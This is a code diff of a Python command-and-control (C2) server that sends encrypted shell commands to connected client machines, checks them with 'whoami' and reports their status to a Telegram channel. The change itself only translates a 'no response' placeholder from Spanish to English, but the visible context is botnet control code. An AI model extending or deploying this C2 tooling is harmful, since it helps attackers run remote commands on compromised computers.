@@ -35,7 +35,7 @@ class ClientSession:
         try:
             self.socket.send(command.encode("utf-8"))
             response = self.socket.recv(4096).decode("utf-8").strip()
-            return response if response else "[Sin respuesta]"
+            return response if response else "[No response]"
         except Exception as e:
             return f"[!] Error executing the command: {e}"
 
@@ -219,7 +219,7 @@ class C2Server:
         for ip, session in self.clients.items():
             try:
                 response = self.execute_shell_command(session, "whoami")
-                if response and response != "[Sin respuesta]":
+                if response and response != "[No response]":
                     bot.send_message(C2_CHANNEL_ID, f"[{ip}] ✅ ONLINE")
                 else:
                     bot.send_message(C2_CHANNEL_ID, f"[{ip}] ❌ NO RESPONSE")
@@ -273,7 +273,7 @@ class C2Server:
         try:
             response = self.execute_shell_command(session, "whoami")
 
-            if response and response != "[Sin respuesta]":
+            if response and response != "[No response]":
                 bot.send_message(C2_CHANNEL_ID, "[+] Client *ONLINE*", message_thread_id=message_thread_id, parse_mode="Markdown")
             else:
                 bot.send_message(C2_CHANNEL_ID, "[!] Client *NO RESPONSE*", message_thread_id=message_thread_id, parse_mode="Markdown")
@@ -293,7 +293,7 @@ class C2Server:
         client_socket.socket.send(encrypted_command)
         encrypted_response = self.recv_all(client_socket.socket)
         response = self.decrypt_message(encrypted_response).strip()
-        return response if response else "[Sin respuesta]"
+        return response if response else "[No response]"
 
 
     def send_command_to_client(self, client_socket, command, topic_id):
